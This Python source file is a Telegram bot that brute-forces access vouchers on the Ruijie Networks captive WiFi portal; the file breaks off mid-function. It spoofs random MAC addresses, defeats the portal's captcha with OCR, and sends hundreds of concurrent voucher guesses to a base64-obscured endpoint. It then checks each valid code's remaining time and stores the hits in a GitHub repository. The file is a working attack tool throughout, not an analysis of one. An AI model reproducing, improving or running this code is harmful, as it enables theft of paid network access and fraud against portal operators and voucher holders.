# ═══════════════════════════════════════════════════════════════════════════
#  Voucher Bot — Optimized (shared session, SIGTERM-safe, faster captcha)
#  Requires env vars: BOT_TOKEN, GITHUB_TOKEN, REPO_OWNER, REPO_NAME, ADMIN_ID
# ═══════════════════════════════════════════════════════════════════════════
import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, signal
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
from urllib.parse import urlparse, parse_qs
import ipaddress
import cv2
import ddddocr
import numpy as np
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
)
logger = logging.getLogger("voucherbot")


# ── Environment variables (NO hardcoded secrets) ───────────────────────────
BOT_TOKEN    = os.environ.get("BOT_TOKEN", "").strip()
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "").strip()
REPO_OWNER   = os.environ.get("REPO_OWNER", "thurahteta06-sketch").strip()
REPO_NAME    = os.environ.get("REPO_NAME", "R1").strip()
ADMIN_ID     = os.environ.get("ADMIN_ID", "1626617395").strip()

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is required")
GITHUB_ENABLED = bool(GITHUB_TOKEN)
if not GITHUB_ENABLED:
    logger.warning("GITHUB_TOKEN not set — GitHub sync disabled")


# ── Global structures ─────────────────────────────────────────────────────
bot = AsyncTeleBot(BOT_TOKEN)

user_data        = {}   # {chat_id: {"session_url": ...}}
scan_tasks       = {}   # {chat_id: {"task","stop","scan_id"}}
success_texts    = {}   # {chat_id: [{"code","session_id","plan"}]}
limited_texts    = {}   # {chat_id: [code, ...]}
notify_setting   = {}   # {chat_id: bool}
last_scan_params = {}   # {chat_id: {mode,lengths,target,plan_filters}}
pending_brute    = {}   # {chat_id: {mode,lengths,target,plan_filters}}
notify_state     = {}   # {chat_id: [{"msg_id","first_idx"}, ...]}
limited_notify   = {}   # {chat_id: message_id}
setup_confirm    = {}   # {chat_id: url}

SUCCESS_CODE = asyncio.Queue()
session      = None     # global shared aiohttp.ClientSession
_connector   = None
_voucher_sem = None
_start_time  = time.monotonic()
_shutdown_event = asyncio.Event()

# ── Performance knobs ─────────────────────────────────────────────────────
CONCURRENCY      = 400   # ↑ from 200 (back off if "request limited" appears)
CAPTCHA_MAX_TRIES = 4    # ↓ from 8
BATCH_SIZE       = 500   # ↓ from 1000 (faster progress updates)

STATE_FILE  = "state.json"


# ── Time / plan helpers ───────────────────────────────────────────────────
def _parse_seconds(val):
    secs  = int(val)
    hours = secs // 3600
    mins  = (secs % 3600) // 60
    if hours > 0: return f"{hours}h {mins}m"
    if mins  > 0: return f"{mins}m"
    return f"{secs}s"

def _parse_minutes(val):
    total = int(val)
    if total <= 0: return "0m"
    if total < 60: return f"{total}m"
    h, m = divmod(total, 60)
    if h < 24: return f"{h}h {m}m" if m else f"{h}h"
    d, rh = divmod(h, 24)
    if d < 30: return f"{d}d {rh}h" if rh else f"{d}d"
    mo, rd = divmod(d, 30)
    return f"{mo}mo {rd}d" if rd else f"{mo}mo"

PLAN_RE = re.compile(r'^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$', re.IGNORECASE)

def plan_to_minutes(s):
    if not s: return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':  total += val * 30 * 24 * 60
        elif unit == 'd': total += val * 24 * 60
        elif unit == 'h': total += val * 60
        elif unit in ('min', 'm'): total += val
    return total

def parse_length_spec(spec):
    lengths = set()
    for part in spec.split(','):
        part = part.strip()
        if not part: continue
        if '-' in part:
            a, b = part.split('-', 1)
            a, b = int(a), int(b)
            if a > b: a, b = b, a
            for i in range(a, b + 1): lengths.add(i)
        else:
            lengths.add(int(part))
    result = sorted(lengths)
    if not result:
        raise ValueError("Length spec empty")
    for L in result:
        if L < 1 or L > 20:
            raise ValueError(f"Length {L} must be 1-20")
    return result


# ── SSRF guard ────────────────────────────────────────────────────────────
def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            return False
        host = parsed.hostname or ""
        if not host: return False
        if host.lower() in ("localhost", "0.0.0.0"):
            return False
        try:
            addr = ipaddress.ip_address(host)
            if any([addr.is_loopback, addr.is_private, addr.is_link_local,
                    addr.is_reserved, addr.is_unspecified, addr.is_multicast]):
                return False
        except ValueError:
            pass
        return True
    except Exception:
        return False


# ── Admin guard ───────────────────────────────────────────────────────────
def is_admin(message) -> bool:
    return str(message.chat.id) == ADMIN_ID


# ── Chunked sender ────────────────────────────────────────────────────────
async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=None):
    MAX = 4096
    if len(text) <= MAX:
        await bot.send_message(chat_id, text, parse_mode=parse_mode,
                               reply_to_message_id=reply_to_message_id)
        return
    lines = text.split("\n")
    chunk = ""
    first = True
    for line in lines:
        candidate = chunk + ("\n" if chunk else "") + line
        if len(candidate) > MAX:
            if chunk:
                await bot.send_message(
                    chat_id, chunk, parse_mode=parse_mode,
                    reply_to_message_id=reply_to_message_id if first else None
                )
                first = False
            chunk = line
        else:
            chunk = candidate
    if chunk:
        await bot.send_message(
            chat_id, chunk, parse_mode=parse_mode,
            reply_to_message_id=reply_to_message_id if first else None
        )


# ── Web server (keep-alive) ───────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is running 24/7")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 5000)))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"Web server started on port {port}")


# ── GitHub helpers ────────────────────────────────────────────────────────
async def get_file_content(path):
    if not GITHUB_ENABLED:
        return {}, None
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=15)) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
    except Exception as e:
        logger.warning(f"[get_file_content] {path}: {e}")
    return {}, None

async def update_file_content(path, content, sha, message):
    if not GITHUB_ENABLED:
        return None
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json",
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": message, "content": encoded}
    if sha:
        payload["sha"] = sha
    async with session.put(url, headers=headers, json=payload) as response:
        text = await response.text()
        if response.status not in (200, 201):
            raise RuntimeError(f"GitHub PUT failed [{response.status}]: {text[:400]}")
        return text

async def update_file_content_retry(path, content, sha, message, retries=3):
    for attempt in range(retries + 1):
        try:
            return await update_file_content(path, content, sha, message)
        except RuntimeError as e:
            if "409" in str(e) and attempt < retries:
                _, sha = await get_file_content(path)
                await asyncio.sleep(1 + attempt)
                continue
            raise


# ── Modes / iterator ──────────────────────────────────────────────────────
MODE_INFO = {
    "1": ("Digits (0-9)",            string.digits,                          10),
    "2": ("Lowercase (a-z)",         string.ascii_lowercase,                 26),
    "3": ("Uppercase (A-Z)",         string.ascii_uppercase,                 26),
    "4": ("Mixed case (a-zA-Z)",     string.ascii_letters,                   52),
    "5": ("Lowercase + digits",      string.ascii_lowercase + string.digits, 36),
}

def iter_codes(mode, length):
    mode = str(mode)
    length = int(length)
    if mode not in MODE_INFO:
        raise ValueError(f"Mode must be 1-5 (got {mode})")
    if length < 1 or length > 20:
        raise ValueError("Length must be 1-20")

    _, chars, _ = MODE_INFO[mode]

    if mode == "1" and length <= 6:
        n = 10 ** length
        order = list(range(n))
        random.shuffle(order)
        for i in order:
            yield str(i).zfill(length)
        return

    while True:
        yield "".join(random.choice(chars) for _ in range(length))

def mode_length_universe_size(mode, length):
    if mode == "1" and length <= 6:
        return 10 ** length
    return None

def format_progress(checked, speed=0, found=0, target=None,
                    current_length=None, lengths=None):
    lines = ["📋 Status: Running"]
    if current_length is not None and lengths and len(lengths) > 1:
        idx = (lengths.index(current_length) + 1) if current_length in lengths else "?"
        lines.append(f"📏 Length: {current_length} ({idx}/{len(lengths)})")
    lines.append(f"⚡ Speed: {speed:,.0f}/min")
    lines.append(f"🔍 Checked: {checked:,}")
    lines.append(f"💎 Found: {found}")
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)


# ── CAPTCHA ───────────────────────────────────────────────────────────────
_ocr = None

def _get_ocr():
    global _ocr
    if _ocr is None:
        _ocr = ddddocr.DdddOcr(show_ad=False)
    return _ocr

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', thresh)
    return _get_ocr().classification(buf.tobytes()).upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac   = [first] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)


# ── Session / URL helpers (uses global `session`) ─────────────────────────
async def get_session_id(session_url, previous=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': url,
        'upgrade-insecure-requests': '1',
        'user-agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                       'AppleWebKit/537.36 (KHTML, like Gecko) '
                       'Chrome/148.0.0.0 Safari/537.36'),
    }
    try:
        async with session.get(
            url, headers=headers, allow_redirects=True,
            timeout=aiohttp.ClientTimeout(total=15)
        ) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else previous
    except Exception as e:
        logger.debug(f"[get_session_id] {e}")
        return previous

async def Captcha_Image(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html',
        'user-agent': ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                       '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'),
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params=params, headers=headers,
        timeout=aiohttp.ClientTimeout(total=10)
    ) as req:
        return await req.read()

async def Varify_Captcha(session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'user-agent': ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                       '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'),
    }
    async with session.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=headers,
        json={'sessionId': session_id, 'authCode': text},
        timeout=aiohttp.ClientTimeout(total=10)
    ) as req:
        try:
            data = await req.json(content_type=None)
        except Exception:
            data = {}
        return session_id if data.get("success") is True else None

async def check_session_url(session_url):
    if not is_safe_url(session_url):
        return False
    try:
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except Exception:
        return False


# ── Balance ───────────────────────────────────────────────────────────────
async def get_balance(token):
    if not token:
        return "N/A"
    urls = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{token}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{token}",
    ]
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'user-agent': ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                       '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'),
        'x-requested-with': 'XMLHttpRequest',
    }
    for url in urls:
        try:
            async with session.get(
                url, headers=headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                if resp.status != 200:
                    continue
                data = await resp.json(content_type=None)
                candidates = [data]
                for k in ('result', 'data'):
                    if isinstance(data, dict) and isinstance(data.get(k), dict):
                        candidates.append(data[k])
                for d in candidates:
                    if not isinstance(d, dict):
                        continue
                    for key in ('totalMinutes', 'remainingMinutes',
                                'remainMinutes', 'leftMinutes',
                                'balance', 'remaining'):
                        if d.get(key) is not None:
                            return _parse_minutes(d[key])
                    for key in ('remainingSeconds', 'remainTime',
                                'remainingTime', 'leftTime', 'timeLeft',
                                'remain_time'):
                        if d.get(key) is not None:
                            return _parse_seconds(d[key])
        except Exception as e:
            logger.debug(f"[get_balance] {url}: {e}")
    return "N/A"


# ── Core voucher check (shared session) ───────────────────────────────────
POST_URL = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

async def perform_check(session_url, code, chat_id,
                        scan_id=None, recheck=False,
                        plan_filters=None):
    if not recheck:
        ct = scan_tasks.get(chat_id)
        if not ct or ct.get("scan_id") != scan_id:
            return

    response   = None
    session_id = None

    for attempt in range(3):
        session_id = await get_session_id(session_url)
        if not session_id:
            await asyncio.sleep(0.2)
            continue

        auth_code = None
        for _ in range(CAPTCHA_MAX_TRIES):
            try:
                img  = await Captcha_Image(session_id)
                text = await Captcha_Text(img)
                if text and await Varify_Captcha(session_id, text):
                    auth_code = text
                    break
            except Exception as e:
                logger.debug(f"[captcha] {e}")
                continue
        if not auth_code:
            continue

        if not recheck:
            ct = scan_tasks.get(chat_id)
            if not ct or ct.get("scan_id") != scan_id or ct.get("stop"):
                return

        data = {"accessCode": code, "sessionId": session_id,
                "apiVersion": 1, "authCode": auth_code}
        headers = {
            "authority": "portal-as.ruijienetworks.com",
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://portal-as.ruijienetworks.com",
            "referer": (f"https://portal-as.ruijienetworks.com/download/"
                        f"static/maccauth/src/index.html?sessionId={session_id}"),
            "user-agent": ("Mozilla/5.0 (Linux; Android 12; K) "
                           "AppleWebKit/537.36 (KHTML, like Gecko) "
                           "Chrome/139.0.0.0 Mobile Safari/537.36"),
        }
        try:
            async with session.post(POST_URL, json=data, headers=headers,
                                    timeout=aiohttp.ClientTimeout(total=20)) as req:
                response = await req.text()
                if req.status == 200 and attempt == 0:
                    # Only log on attempt=1 or non-200 to reduce log spam
                    logger.debug(f"[voucher] code={code} status={req.status}")
                elif req.status != 200:
                    logger.info(f"[voucher] code={code} attempt={attempt+1} "
                                f"status={req.status}")
        except Exception as e:
            logger.debug(f"[perform_check] post {e}")
            response = None
            continue

        if response and 'request limited' in response:
            logger.warning(f"[perform_check] rate limited code={code} "
                           f"attempt={attempt+1}/3")
            await asyncio.sleep(2)
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        token = session_id
        try:
            res_data  = json.loads(response)
            logon_url = (res_data.get("result", {}) or {}).get("logonUrl", "") \
                        if isinstance(res_data, dict) else ""
            tm = re.search(r'token=([^&]+)', logon_url)
            if tm:
                token = tm.group(1)
        except Exception:
            pass

        plan_str = "N/A"
        try:
            fetched = await get_balance(token)
            if fetched not in ("N/A", "Error"):
                plan_str = fetched
        except Exception:
            pass

        if plan_filters and plan_str not in ("N/A", "Error"):
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None

        success_texts.setdefault(chat_id, []).append(
            {"code": code, "session_id": session_id, "plan": plan_str}
        )
        await SUCCESS_CODE.put(
            {"chat_id": chat_id, "code": code,
             "session_id": session_id, "plan": plan_str}
        )

        if notify_setting.get(chat_id, False):
            try:
                await _notify_success(chat_id, code, plan_str)
            except Exception as e:
                logger.warning(f"[notify success] {e}")
        return code

    elif 'STA' in response:
        limited_texts.setdefault(chat_id, []).append(code)
        if notify_setting.get(chat_id, False):
            try:
                await _notify_limited(chat_id)
            except Exception as e:
                logger.warning(f"[notify limited] {e}")


async def _notify_success(chat_id, code, plan_str):
    items = success_texts.get(chat_id, [])
    n = len(items)
    pages = notify_state.get(chat_id) or []
    MAX = 4096

    def build_page_text(first_idx):
        lines = [f"`{it['code']}` – ⏳ {it.get('plan','N/A')}"
                 for it in items[first_idx:]]
        header = (f"✅ Success Codes ({n}):\n" if first_idx == 0
                  else f"✅ Success Codes (cont. {first_idx+1}–{n}):\n")
        return header + "\n".join(lines)

    if not pages:
        text = build_page_text(0)
        sent = await bot.send_message(chat_id, text, parse_mode="Markdown")
        notify_state[chat_id] = [{"msg_id": sent.message_id, "first_idx": 0}]
        return

    last = pages[-1]
    first_idx = last["first_idx"]
    new_text = build_page_text(first_idx)
    if len(new_text) <= MAX:
        try:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=last["msg_id"],
                text=new_text, parse_mode="Markdown"
            )
        except Exception as e:
            if "not modified" not in str(e).lower():
                sent = await bot.send_message(chat_id, new_text,
                                              parse_mode="Markdown")
                pages[-1] = {"msg_id": sent.message_id, "first_idx": first_idx}
                notify_state[chat_id] = pages
    else:
        new_page_text = f"✅ Success Codes (cont. {n}):\n`{code}` – ⏳ {plan_str}"
        sent = await bot.send_message(chat_id, new_page_text,
                                      parse_mode="Markdown")
        pages.append({"msg_id": sent.message_id, "first_idx": n - 1})
        notify_state[chat_id] = pages


async def _notify_limited(chat_id):
    codes = limited_texts.get(chat_id, [])
    text  = "⚠️ Limited Codes ({n}):\n".format(n=len(codes)) + "\n".join(codes)
    if chat_id not in limited_notify:
        sent = await bot.send_message(chat_id, text)
        limited_notify[chat_id] = sent.message_id
    else:
        try:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=limited_notify[chat_id], text=text
            )
        except Exception as e:
            if "not modified" not in str(e).lower():
                sent = await bot.send_message(chat_id, text)
                limited_notify[chat_id] = sent.message_id


# ── Brute-force runner ────────────────────────────────────────────────────
async def run_bruteforce(mode, lengths, chat_id, session_url, scan_id,
                         target=None, progress_msg=None, plan_filters=None):
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    checked = 0
    found   = 0
    scan_start = time.monotonic()

    try:
        for li, length in enumerate(lengths):
            try:
                code_iter = iter_codes(mode, length)
            except ValueError as e:
                await bot.send_message(chat_id, f"❌ {e}")
                return

            while True:
                ct = scan_tasks.get(chat_id)
                if not ct or ct.get("scan_id") != scan_id:
                    return
                if ct.get("stop"):
                    remaining = lengths[li:]
                    last_scan_params[chat_id] = {
                        "mode": mode, "lengths": remaining, "target": target,
                        "plan_filters": plan_filters or [],
                    }
                    save_state()
                    return

                batch = []
                for _ in range(BATCH_SIZE):
                    try:
                        batch.append(next(code_iter))
                    except StopIteration:
                        break
                if not batch:
                    break

                async def _check(c):
                    async with _voucher_sem:
                        return await perform_check(
                            session_url, c, chat_id, scan_id,
                            plan_filters=plan_filters
                        )

                results = await asyncio.gather(
                    *[_check(c) for c in batch], return_exceptions=True
                )

                for res in results:
                    if res and not isinstance(res, Exception):
                        found += 1
                        if target and found >= target:
                            try:
                                await bot.edit_message_text(
                                    chat_id=chat_id,
                                    message_id=progress_msg.message_id,
                                    text="🎯 Target reached!"
                                )
                            except Exception:
                                pass
                            last_scan_params.pop(chat_id, None)
                            save_state()
                            return

                checked += len(batch)
                elapsed = time.monotonic() - scan_start
                speed   = (checked / elapsed * 60) if elapsed > 0 else 0
                text    = format_progress(checked, speed, found, target,
                                          current_length=length, lengths=lengths)
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=progress_msg.message_id,
                        text=text
                    )
                except Exception as e:
                    if "not modified" not in str(e).lower():
                        try:
                            nm = await bot.send_message(chat_id, text)
                            progress_msg.message_id = nm.message_id
                        except Exception:
                            pass

        if progress_msg:
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text="✅ Scan completed."
                )
            except Exception:
                pass
        last_scan_params.pop(chat_id, None)
        save_state()

    except asyncio.CancelledError:
        last_scan_params[chat_id] = {
            "mode": mode, "lengths": lengths, "target": target,
            "plan_filters": plan_filters or [],
        }
        save_state()
        raise
    finally:
        scan_tasks.pop(chat_id, None)


# ── GitHub sync scheduler ────────────────────────────────────────────────
async def github_update_scheduler():
    if not GITHUB_ENABLED:
        return
    while True:
        await asyncio.sleep(60)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if not items:
            continue
        try:
            results, sha = await get_file_content("result.json")
            for item in items:
                chat_id = str(item["chat_id"])
                code    = item["code"]
                sid     = item.get("session_id", "")
                plan    = item.get("plan", "N/A")
                bucket  = results.setdefault(chat_id, [])
                existing = [e["code"] if isinstance(e, dict) else e
                            for e in bucket]
                if code not in existing:
                    bucket.append({"code": code,
                                   "session_id": sid, "plan": plan})
            await update_file_content_retry("result.json", results, sha,
                                            "Periodic Update")
        except Exception as e:
            logger.warning(f"[github_scheduler] {e}")
            for it in items:
                await SUCCESS_CODE.put(it)


# ── State save/load ───────────────────────────────────────────────────────
def save_state():
    try:
        payload = {
            "user_data":        {str(k): v for k, v in user_data.items()},
            "notify_setting":   {str(k): v for k, v in notify_setting.items()},
            "last_scan_params": {str(k): v for k, v in last_scan_params.items()},
        }
        tmp = STATE_FILE + ".tmp"
        with open(tmp, "w") as f:
            json.dump(payload, f, ensure_ascii=False)
        os.replace(tmp, STATE_FILE)
    except Exception as e:
        logger.warning(f"[save_state] {e}")

def load_state():
    global user_data, notify_setting, last_scan_params
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE) as f:
            payload = json.load(f)
        for k, v in payload.get("user_data", {}).items():
            try: user_data[int(k)] = v
            except (ValueError, TypeError): pass
        for k, v in payload.get("notify_setting", {}).items():
            try: notify_setting[int(k)] = bool(v)
            except (ValueError, TypeError): pass
        for k, v in payload.get("last_scan_params", {}).items():
            try: last_scan_params[int(k)] = v
            except (ValueError, TypeError): pass
        logger.info(f"[startup] Loaded state for {len(user_data)} user(s)")
    except Exception as e:
        logger.warning(f"[load_state] {e}")


async def load_saved_results():
    if not GITHUB_ENABLED:
        return
    try:
        results, _ = await get_file_content("result.json")
        for chat_id_str, entries in results.items():
            try:
                cid = int(chat_id_str)
            except ValueError:
                continue
            bucket = success_texts.setdefault(cid, [])
            for entry in entries:
                if isinstance(entry, dict):
                    code = entry.get("code", "")
                    sid  = entry.get("session_id", "")
                    plan = entry.get("plan", "N/A")
                else:
                    code, sid, plan = str(entry), "", "N/A"
                if not any(e["code"] == code for e in bucket):
                    bucket.append({"code": code, "session_id": sid, "plan": plan})
        total = sum(len(v) for v in success_texts.values())
        logger.info(f"[startup] Loaded {total} saved codes from GitHub")
    except Exception as e:
        logger.warning(f"[load_saved_results] {e}")


# ── Usage text ────────────────────────────────────────────────────────────
USAGE_TEXT = (
    "📖 **Voucher Bot — အသုံးပြုနည်း**\n\n"
    "**၁။ Setup:**\n"
    "`/setup <session_url>`\n\n"
    "**၂။ ရှာဖွေခြင်း:**\n"
    "`/brute <mode> <lengths> [target] [plan...]`\n\n"
    "*Mode:*\n"
    "  1 = Digits (0-9)\n"
    "  2 = Lowercase (a-z)\n"
    "  3 = Uppercase (A-Z)\n"
    "  4 = Mixed (a-zA-Z)\n"
    "  5 = Lowercase + digits\n\n"
    "*Lengths:*\n"
    "  `6`         → length 6\n"
    "  `6,7,8`     → 6,7,8 ဆက်တိုက်\n"
    "  `6-8`       → range 6-8\n"
    "  `6,8-10,12` → mixed\n\n"
    "*ဥပမာ:*\n"
    "  `/brute 1 6 5`\n"
    "  `/brute 1 4-8 10`\n"
    "  `/brute 5 4,6-8 1d`\n"
    "  `/brute 2 6 1d 1mo`\n\n"
    "**၃။** `/status` — bot အခြေအနေ\n"
    "**၄။** `/stop` — ရပ်တန့်\n"
    "**၅။** `/resume` — ဆက်ရှာ\n"
    "**၆။** `/saved` — ရလဒ်ကြည့်\n"
    "**၇။** `/delete_saved` — ရလဒ်ဖျက်\n"
    "**၈။** `/recheck` — success codes ပြန်စစ်\n"
    "**၉။** `/notify` — notify ON/OFF"
)


# ── Commands ─────────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    if not is_admin(message):
        await bot.reply_to(message, "❌ No Permission")
        return
    await bot.reply_to(message, "Bot ready. /help ဖြင့် ကြည့်ပါ။")


@bot.message_handler(commands=['help'])
async def cmd_help(message):
    if not is_admin(message):
        await bot.reply_to(message, "❌ No Permission")
        return
    await bot.reply_to(message, USAGE_TEXT, parse_mode="Markdown")


@bot.message_handler(commands=['setup'])
async def cmd_setup(message):
    if not is_admin(message):
        await bot.reply_to(message, "❌ No Permission")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup <session_url>")
        return
    url     = args[1].strip()
    chat_id = message.chat.id

    await bot.reply_to(message, "⏳ Session URL စစ်ဆေးနေပါသည်...")
    if not await check_session_url(url):
        await bot.reply_to(message,
            "❌ Session URL မှားနေသည် (သို့) required params မပါပါ။")
        return

    if chat_id in user_data and user_data[chat_id].get("session_url") != url:
        setup_confirm[chat_id] = url
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("✅ Confirm (clear saved)",
                                 callback_data="setup_yes"),
            InlineKeyboardButton("❌ Cancel", callback_data="setup_no"),
        )
        await bot.reply_to(message,
            "⚠️ သင့်မှာ session အဟောင်း ရှိပြီးသား။ URL အသစ်ပြောင်းရင် "
            "saved codes တွေ ဖျက်ခံရမယ်။ သေချာပါသလား?",
            reply_markup=markup)
        return

    await _apply_setup(chat_id, url)
    await bot.reply_to(message, "✅ Session URL သိမ်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")


async def _apply_setup(chat_id, url):
    if chat_id in scan_tasks:
        info = scan_tasks.pop(chat_id, None)
        if info and info.get("task"):
            info["task"].cancel()

    user_data.setdefault(chat_id, {})['session_url'] = url
    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    last_scan_params.pop(chat_id, None)
    pending_brute.pop(chat_id, None)
    notify_state.pop(chat_id, None)
    limited_notify.pop(chat_id, None)

    if GITHUB_ENABLED:
        try:
            results, sha = await get_file_content("result.json")
            if str(chat_id) in results:
                del results[str(chat_id)]
                await update_file_content_retry(
                    "result.json", results, sha,
                    f"Clear codes for {chat_id} on setup"
                )
        except Exception as e:
            logger.warning(f"[_apply_setup] GitHub clear failed: {e}")
    save_state()


@bot.callback_query_handler(func=lambda c: c.data in ("setup_yes", "setup_no"))
async def handle_setup_cb(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "setup_yes":
        url = setup_confirm.pop(chat_id, None)
        if not url:
            await bot.edit_message_text(
                "Session မရှိတော့ပါ။ ထပ်မံပေးပို့ပါ။",
                chat_id=chat_id, message_id=call.message.message_id
            )
            return
        await _apply_setup(chat_id, url)
        await bot.edit_message_text(
            "✅ Session URL အသစ် သိမ်းပြီးပါပြီ။",
            chat_id=chat_id, message_id=call.message.message_id
        )
    else:
        setup_confirm.pop(chat_id, None)
        await bot.edit_message_text(
            "❌ Cancelled.",
            chat_id=chat_id, message_id=call.message.message_id
        )


@bot.message_handler(commands=['brute'])
async def cmd_brute(message):
    if not is_admin(message):
        await bot.reply_to(message, "❌ No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, USAGE_TEXT, parse_mode="Markdown")
        return

    mode = args[1]
    if mode not in MODE_INFO:
        await bot.reply_to(message, "❌ Mode သည် 1-5 အတွင်း ဖြစ်ရမည်။")
        return

    try:
        lengths = parse_length_spec(args[2])
    except ValueError as e:
        await bot.reply_to(message,
            f"❌ Length spec မှားနေသည်: {e}\n"
            "ဥပမာ: 6 | 6,7,8 | 6-8 | 6,8-10,12")
        return

    target = None
    plan_filters = []
    idx = 3
    if idx < len(args) and not PLAN_RE.match(args[idx]):
        try:
            target = int(args[idx])
            idx += 1
        except ValueError:
            await bot.reply_to(message,
                "❌ Target သည် ဂဏန်းဖြစ်ရမည်။\n"
                "Plan ဥပမာ: 30min, 2h, 1d, 1mo, unlimit")
            return

    for arg in args[idx:]:
        if PLAN_RE.match(arg):
            plan_filters.append(arg)
        else:
            await bot.reply_to(message,
                f"❌ '{arg}' plan ပုံစံမမှန်ပါ။\n"
                "ဥပမာ: 30min, 2h, 1d, 1mo, unlimit")
            return

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("▶️ Resume", callback_data="resume_scan"),
            InlineKeyboardButton("🆕 New Scan", callback_data="new_scan"),
        )
        pending_brute[chat_id] = {
            "mode": mode, "lengths": lengths,
            "target": target, "plan_filters": plan_filters,
        }
        prev = last_scan_params[chat_id]
